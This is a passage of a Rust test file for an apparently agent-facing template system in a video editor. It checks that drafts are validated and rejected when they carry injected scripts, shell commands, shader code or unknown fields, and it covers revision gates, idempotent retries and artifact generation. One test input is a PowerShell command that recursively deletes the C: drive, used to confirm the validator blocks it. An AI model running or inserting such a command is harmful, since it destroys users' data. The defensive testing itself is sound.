    let raw_script = serde_json::to_string(&draft_script).unwrap();
    let rep_script = AgentTemplateService::validate_draft(&draft_script, Some(&raw_script), None);
    assert!(!rep_script.valid);
    assert!(rep_script
        .issues
        .iter()
        .any(|i| i.code == "MALICIOUS_SCRIPT_TAG"));

    // 2. PowerShell command injection
    let mut draft_ps = create_vietnamese_title_draft_v1();
    draft_ps.name = "powershell -Command Remove-Item -Recurse C:\\".to_string();
    let raw_ps = serde_json::to_string(&draft_ps).unwrap();
    let rep_ps = AgentTemplateService::validate_draft(&draft_ps, Some(&raw_ps), None);
    assert!(!rep_ps.valid);
    assert!(rep_ps
        .issues
        .iter()
        .any(|i| i.code == "MALICIOUS_SHELL_COMMAND"));

    // 3. Native shader keyword injection
    let mut draft_shader = create_vietnamese_title_draft_v1();
    draft_shader.description = "uniform mat4 modelView; gl_FragColor = vec4(1.0);".to_string();
    let raw_shader = serde_json::to_string(&draft_shader).unwrap();
    let rep_shader = AgentTemplateService::validate_draft(&draft_shader, Some(&raw_shader), None);
    assert!(!rep_shader.valid);
    assert!(rep_shader
        .issues
        .iter()
        .any(|i| i.code == "UNSUPPORTED_NATIVE_SHADER"));

    // 4. Unknown fields in draft payload (serde deny_unknown_fields)
    let json_unknown = serde_json::json!({
        "draftId": "d1",
        "schemaVersion": 1,
        "templateId": "t1",
        "templateVersion": 1,
        "name": "Hack",
        "category": "Title",
        "description": "desc",
        "layers": [],
        "provenance": { "authorType": "agent" },
        "unvettedUnknownExtension": "evil_payload"
    });
    let parse_res: Result<TemplateDraft, _> = serde_json::from_value(json_unknown);
    assert!(
        parse_res.is_err(),
        "Serde must reject unknown fields before processing"
    );
}

#[tokio::test]
async fn test_p35_ac06_budget_limits_and_stale_revision_failures() {
    let temp = test_dir("ac06_limits");
    let project_path = temp.as_ref().join("proj_limits.tcproj");
    let mut proj = create_base_project("LimitProject");
    proj.tracks[0]
        .items
        .push(create_text_item("item_lim", "Text", 90));
    proj.revision = 2; // Project is already at revision 2
    save_project_atomic(&proj, &project_path).unwrap();

    let server = TinixCutMcpServer::new();
    let mut client = DuplexMcpClient::new(server).await;

    // 1. Repair iteration budget exceeded (iteration 6 > 5)
    let mut draft_budget = create_vietnamese_title_draft_v1();
    draft_budget.provenance.iteration = 6;
    let rep_budget = AgentTemplateService::validate_draft(&draft_budget, None, None);
    assert!(!rep_budget.valid);
    assert!(rep_budget
        .issues
        .iter()
        .any(|i| i.code == "REPAIR_BUDGET_EXCEEDED"));

    // 2. Layer count exceeded (> 16 layers)
    let mut draft_layers = create_vietnamese_title_draft_v1();
    while draft_layers.layers.len() <= 16 {
        let mut layer = draft_layers.layers[0].clone();
        layer.layer_id = format!("layer_extra_{}", draft_layers.layers.len());
        draft_layers.layers.push(layer);
    }
    let rep_layers = AgentTemplateService::validate_draft(&draft_layers, None, None);
    assert!(!rep_layers.valid);
    assert!(rep_layers
        .issues
        .iter()
        .any(|i| i.code == "EXCEEDS_LAYER_LIMIT"));

    // 3. Stale revision gate: passing baseRevision = 0 when project is at 2
    let draft_valid = create_vietnamese_title_draft_v1();
    let stale_res = client
        .call_tool(
            "tinixcut_template_apply",
            serde_json::json!({
                "projectPath": project_path.to_string_lossy().to_string(),
                "itemId": "item_lim",
                "draft": draft_valid,
                "clientId": "test_agent",
                "clientEpoch": 1,
                "sequenceNumber": 1,
                "transactionId": "tx_stale",
                "baseRevision": 0, // Stale revision
            }),
        )
        .await;

    let err_val = &stale_res["result"]["structuredContent"];
    assert_eq!(err_val["code"], "STALE_REVISION");
    assert_eq!(stale_res["result"]["isError"], true);

    // Verify zero disk mutation
    let reloaded = load_project(&project_path).unwrap();
    assert_eq!(reloaded.revision, 2);

    // 4. Duplicate retry idempotency
    let apply_first = client
        .call_tool(
            "tinixcut_template_apply",
            serde_json::json!({
                "projectPath": project_path.to_string_lossy().to_string(),
                "itemId": "item_lim",
                "draft": draft_valid,
                "clientId": "test_agent_idemp",
                "clientEpoch": 1,
                "sequenceNumber": 1,
                "transactionId": "tx_idemp_1",
                "baseRevision": 2,
            }),
        )
        .await;
    assert_eq!(
        apply_first["result"]["isError"].as_bool(),
        Some(false).or(None)
    );
    let receipt1 = &apply_first["result"]["structuredContent"];
    let rev_first = receipt1["revision"].as_u64().unwrap();

    // Retry with exact identical identity
    let apply_retry = client
        .call_tool(
            "tinixcut_template_apply",
            serde_json::json!({
                "projectPath": project_path.to_string_lossy().to_string(),
                "itemId": "item_lim",
                "draft": draft_valid,
                "clientId": "test_agent_idemp",
                "clientEpoch": 1,
                "sequenceNumber": 1,
                "transactionId": "tx_idemp_1",
                "baseRevision": 2,
            }),
        )
        .await;
    let receipt2 = &apply_retry["result"]["structuredContent"];
    assert_eq!(
        receipt2["revision"].as_u64().unwrap(),
        rev_first,
        "Duplicate retry must be idempotent without incrementing revision"
    );
}

#[tokio::test]
async fn test_p35_ac07_timeout_cancellation_and_resource_safety() {
    let server = TinixCutMcpServer::new();
    let mut client = DuplexMcpClient::new(server).await;

    // Cancellation of non-existent job returns false cleanly without error
    let cancel_res = client
        .call_tool(
            "tinixcut_export_cancel",
            serde_json::json!({ "jobId": "job_non_existent" }),
        )
        .await;
    assert_eq!(
        cancel_res["result"]["structuredContent"]["cancelled"],
        false
    );
}

#[test]
#[ignore]
fn p35_generate_evidence_artifacts() {
    let manifest_dir = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
    let evidence_dir = manifest_dir
        .parent()
        .expect("workspace root")
        .join("artifacts/animated-text-templates/phase-35");
    fs::create_dir_all(&evidence_dir).expect("Create phase-35 artifacts directory");

    let draft_v1 = create_vietnamese_title_draft_v1();
    let draft_v2 = create_vietnamese_title_draft_v2_refined(&draft_v1);
    let quote_draft = create_multilayer_quote_card_draft();

    // 1. Save drafts
    fs::write(
        evidence_dir.join("draft_vietnamese_v1.json"),
        serde_json::to_string_pretty(&draft_v1).unwrap(),
    )
    .unwrap();
    fs::write(
        evidence_dir.join("draft_vietnamese_v2_refined.json"),
        serde_json::to_string_pretty(&draft_v2).unwrap(),
    )
    .unwrap();
    fs::write(
        evidence_dir.join("draft_quote_card.json"),
        serde_json::to_string_pretty(&quote_draft).unwrap(),
    )
    .unwrap();

    // 2. Capabilities & Schema
    let caps = AgentTemplateService::capabilities();
    fs::write(
        evidence_dir.join("capabilities.json"),
        serde_json::to_string_pretty(&caps).unwrap(),
    )
    .unwrap();

    let schema = AgentTemplateService::draft_json_schema();
    fs::write(
        evidence_dir.join("draft_schema.json"),
        serde_json::to_string_pretty(&schema).unwrap(),
    )
    .unwrap();

    // 3. Validation Reports
    let catalog = TemplateCatalog::default_catalog();
    let val_success = AgentTemplateService::validate_draft(&draft_v2, None, Some(&catalog));
    fs::write(
        evidence_dir.join("validation_report_success.json"),
        serde_json::to_string_pretty(&val_success).unwrap(),
    )
    .unwrap();

    let val_issues = AgentTemplateService::validate_draft(&quote_draft, None, Some(&catalog));
    fs::write(
        evidence_dir.join("validation_report_issues.json"),
        serde_json::to_string_pretty(&val_issues).unwrap(),
    )
    .unwrap();

    // 4. Render preview PNG frames
    let preview_receipt_v2 = AgentTemplateService::preview_draft_to_png(
        &draft_v2,
        &evidence_dir.join("vietnamese_preview.png"),
        1.0,
        Some(1280),
        Some(720),
    )
    .expect("Render preview PNG");

    let preview_receipt_quote = AgentTemplateService::preview_draft_to_png(
        &quote_draft,
        &evidence_dir.join("quote_card_preview.png"),
        1.0,
        Some(1280),
        Some(720),
    )
    .expect("Render quote preview PNG");

    // 5. Evidence summary
    let summary = serde_json::json!({
        "phase": 35,
        "title": "Agent Template Generation & Refinement via CLI/MCP",
        "gate": "T4 PASS",
        "mcp_tools_total": 12,
        "mcp_tools_added": [
            "tinixcut_template_validate",
            "tinixcut_template_preview",
            "tinixcut_template_apply",
            "tinixcut_template_save"
        ],
        "vietnamese_preview": {
            "file": "vietnamese_preview.png",
            "width": preview_receipt_v2.width,
            "height": preview_receipt_v2.height,
            "nonZeroPixels": preview_receipt_v2.non_zero_pixels
        },
        "quote_card_preview": {
            "file": "quote_card_preview.png",
            "width": preview_receipt_quote.width,
            "height": preview_receipt_quote.height,
            "nonZeroPixels": preview_receipt_quote.non_zero_pixels
        },
        "verified_features": [
            "Typed declarative draft contract with strict schema validation",
            "Serde deny_unknown_fields and deep script/shell/expression scanning",
            "Vietnamese gradient + stroke + shadow + character in/out text animation",
            "Candidate refinement tracking (parent draft reference, iteration budget)",
            "Shared compositor preview parity with export",
            "Atomic CommandService apply transaction with durable persistence",
            "Replay idempotency and stale revision gates",
            "CLI and MCP deterministic equivalence",
            "TemplateCatalog save and .tinixtpl portable pack roundtrip"
        ]
    });

    fs::write(
        evidence_dir.join("evidence-summary.json"),
        serde_json::to_string_pretty(&summary).unwrap(),
    )
    .unwrap();
}
